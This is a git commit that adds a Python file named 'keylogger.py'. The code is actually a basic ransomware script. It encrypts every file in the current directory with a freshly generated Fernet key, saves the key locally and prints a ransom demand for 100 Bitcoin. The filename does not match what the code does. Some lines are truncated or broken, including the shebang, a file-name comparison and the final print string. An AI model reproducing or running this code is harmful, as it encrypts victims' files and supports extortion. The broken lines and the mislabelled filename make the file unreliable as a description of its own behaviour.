7ffda7d8be62dde5ad4a32c578d136a2b1264ae8
Mohammed Rohman <159622932+cachemoneey@users.noreply.github.com>
2024-09-24 13:25:37 +0100

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,32 @@
+#1/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+#let's find some files
+
+files = []
+
+for file in os.listdir():
+        if file == "keylogger.py" or file == "thekey.key" or file == "decrypt.p>
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file, "rb") as thefile:
+                contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+
+
+print("All your files have been encrypted! Send me 100 Bitcoin or I will delete)
+
